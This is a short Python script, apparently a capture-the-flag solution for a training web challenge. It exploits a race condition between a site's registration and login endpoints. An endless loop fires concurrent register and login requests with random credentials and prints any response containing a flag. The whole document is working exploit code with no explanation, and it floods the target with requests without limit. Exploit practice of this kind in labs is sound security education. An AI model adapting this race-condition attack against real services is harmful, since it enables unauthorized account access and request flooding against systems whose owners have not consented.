import threading
import requests
import random
import string
import time

def randomString(stringLength):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

def login(session,username,password):
	url="http://aart.training.jinblack.it/login.php"
	data = {"username":username,"password":password}
	r = session.post(url,data=data)
	if "flag" in r.text:
		print(r.text)
	return r.text

def registration(session,username,password):
	url="http://aart.training.jinblack.it/register.php"
	data = {"username":username,"password":password}
	r = session.post(url,data=data)
	return r.text

while(True):
    session = requests.Session()
    username = randomString(10)
    password = randomString(10)
    t1=threading.Thread(target=registration, args=(session,username,password))
    t2=threading.Thread(target=login, args=(session,username,password))
    t1.start()
    time.sleep(0.01)
    t2.start()
    t1.join()
    t2.join()